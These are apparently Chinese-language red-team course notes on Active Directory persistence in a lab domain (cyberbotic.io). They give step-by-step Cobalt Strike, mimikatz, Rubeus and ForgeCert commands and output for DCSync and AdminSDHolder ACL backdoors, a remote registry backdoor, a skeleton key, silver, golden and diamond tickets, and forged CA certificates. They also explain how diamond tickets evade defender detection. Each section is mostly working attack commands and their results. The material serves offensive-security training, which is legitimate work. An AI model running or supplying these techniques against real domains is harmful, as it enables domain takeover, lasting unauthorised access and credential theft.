# Domain Dominance

权限维持

# DCSync Backdoor

如果已经取得了DA权限，可以为某些用户添加DCSync权限


使用```Add-DomainObjectAcl```命令为用户```bfarmer ```添加DCSync权限
```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```

如果上面操作成功，在域中的设置应该显示如下

![alt DCSyn](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/dcsync-backdoor.png?width=1920)


现在可以用bfarmer身份执行dcsync
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

[...snip...]

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```


# AdminSDHolder Backdoor

> AdminSDHolder是一个特殊的AD容器，通常作为某些特权组成员的对象的安全模板。Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的

把用户bfarmer 添加进AdminSDHolder
```
beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```

上面操作成功后应显示

![alt alt](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/adminsdholder.png?width=1920)


一旦生效,对Domain Admins组也有了 full control权限

![alt alt](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/da-full-control.png?width=1920)

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            nlamb                    
The command completed successfully.

beacon> run net group "Domain Admins" bfarmer /domain /add
The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            bfarmer                  nlamb                    
The command completed successfully.
```


# Remote Registry Backdoor

远程主机注册表后门

使用工具[DAMP](https://github.com/HarmJ0y/DAMP)

取得了本机(srv-2)的本地管理员权限，为用户DEV\bfarmer添加注册表后门
```
beacon> run hostname
srv-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer

ComputerName BackdoorTrustee
------------ ---------------
SRV-2        DEV\bfarmer
```

DEV\bfarmer访问srv-2
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> powershell Get-RemoteMachineAccountHash -ComputerName srv-2

ComputerName MachineAccountHash              
------------ ------------------              
srv-2        5d0d485386727a8a92498a2c188627ec
```

# Skeleton Key

万能钥匙

制作万能钥匙
```
beacon> run hostname
dc-2

beacon> mimikatz !misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```

使用万能钥匙密码```mimikatz```访问域控
```
beacon> make_token DEV\Administrator mimikatz
[+] Impersonated DEV\bfarmer

beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     03/10/2021 14:38:44   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/10/2021 13:52:03   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     03/11/2021 12:59:29   Users
          dir     02/19/2021 13:26:27   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 448mb    fil     03/11/2021 09:19:53   pagefile.sys
```

**除非重新启动域控制器，否则无法删除万能密钥。万能钥匙可能引起一些复制问题（replication issues）**

# Silver Tickets

银票可以访问一台机器的一个服务，或者一台机器的任何服务

Silver Ticket 是伪造的 TGS

需要的哈希：RC4或者AES keys

制作银票
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```

参数解释
- /user is the username to impersonate.
- /domain is the current domain name.
- /sid is the current domain SID.
- /target is the target machine.
- /aes256 is the AES256 key for the target machine.
- /ticket is the filename to save the ticket as.

导入银票到当前session
```
beacon> make_token DEV\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\srv2-cifs.kirbi
beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin

...
```


下面是一些访问技术与票据的组合
1. psexec				CIFS
2. winrm				HOST & HTTP
3. dcsync (DCs only)	LDAP


# Golden Tickets

金票可以访问任何机器的任何服务

需要```krbtgt```的NTLM/AES信息

制作金票
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi
```

导入金票到当前session
```
beacon> make_token DEV\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings

...
```

# Diamond Tickets

## 什么是Diamond Tickets？
与Golden Tickets一样，Diamond Tickets是一种 TGT，可用于以任何用户身份访问任何服务。


## 为什么需要Diamond Tickets？

首先要知道蓝队可以通过什么方法查找到Golden Tickets，通常有下面两种方法：

1. 查找没有相应AS-REQ的TGS-REQ
2. 查找有异常值的TGT，如给了10年的Mimikatz的生命周期

Diamond Tickets为了规避上面两种被侦查的方法提出两个思路：

1. TGS-REQs将有一个前面的AS-REQ。
2. TGT是由DC签发的，这意味着它将有来自域的Kerberos策略的所有正确细节。 即使这些可以在金票中准确伪造，但它更复杂，容易出错。


制作思路：
钻石票是通过修改由DC签发的合法TGT的字段而制成的。 这是通过请求TGT，用域的krbtgt哈希值对其进行解密，修改票据的所需字段，然后重新加密来实现的。

## 怎么制作Diamond Tickets？

1. 使用Rubeus.exe生成钻石票
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2f[...snip...]91a8aa /nowrap
```

参数解释:
- /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
- /ticketuser is the username of the principal to impersonate.
- /ticketuserid is the domain RID of that principal.  This can be obtained using a command like ```powershell Get-DomainUser -Identity nlamb -Properties objectsid```.
- /groups are the desired group RIDs (512 being Domain Admins).
- /krbkey is the krbtgt AES256 hash.

2. 上面命令生成的tgt
```
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFgz [...snip...] MuSU8=

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

doIFYj [...snip...] MuSU8=
```

使用Rubeus的```describe```命令查看tgt细节
```
C:\>C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  7/7/2022 8:41:46 AM
  EndTime                  :  7/7/2022 6:41:46 PM
  RenewTill                :  1/1/1970 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jp4k3G5LvXpIl3cuAnTtgLuxOWkPJIUjOEZB5wrHdVw=
```

把tgt导入session
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi

beacon> ls \\dc-2\c$
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```



# Forged Certificates

> Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT)
获得对 CA 的本地管理员访问权限允许攻击者提取 CA 私钥，该私钥可用于签署伪造的证书（将其想象为 krbtgt 哈希能够签署伪造的 TGT）

使用工具[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)析出证书秘钥
```
beacon> run hostname
dc-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine
```


![alt Certificates](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/private-ca-key.png?width=1920)

将上面的秘钥内容在kali上保存 为一个```.pem```文件，并且用openssl转成```.pfx```

使用[ForgeCert](https://github.com/GhostPack/ForgeCert)构造伪造的证书

```
C:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"
CA Certificate Information:
  Subject:        CN=ca-1, DC=cyberbotic, DC=io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     2/25/2022 11:29:14 AM
  End Date:       2/25/2047 11:39:08 AM
  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
  Serial:         31AC83C6678F28994CFB58207C9FB668

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@cyberbotic.io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     3/1/2022 2:19:20 PM
  End Date:       3/1/2023 2:19:20 PM
  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132
  Serial:         009E1C0AE8A247695199F8157DB37E38AD

Done. Saved forged certificate to fake.pfx with the password 'password'
```

SubjectAltName最好是域里真实的账号名字

使用Rubeus.exe制造一个tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate:MIACAQ[...snip...]IEAAAA /password:password /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: CN=User 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\Administrator'
[*] Using domain controller: 10.10.15.75:88

[+] TGT request successful!
[*] base64(ticket.kirbi):

doIF4j [...snip...] 5pbw==

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  Administrator
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  3/1/2022 2:22:55 PM
  EndTime                  :  3/2/2022 12:22:55 AM
  RenewTill                :  3/8/2022 2:22:55 PM
  Flags                    :  name-canonicalize, pre-authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  WVE8rl7BfHlOdAPGq7cjJw==
  ASREP (key)              :  5681DDB25CFF9F80C65E4976DB23B0B7
```

把tgt导入到当前session
```
beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-1-tgt.kirbi

beacon> ls \\dc-1.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:55:20   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     03/01/2022 14:06:29   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/01/2022 10:13:44   pagefile.sys
```

**我们不仅限于伪造用户证书，我们也可以对机器做同样的事情。将此与 S4U2self 技巧相结合，以获得对域中任何机器或服务的访问权限。**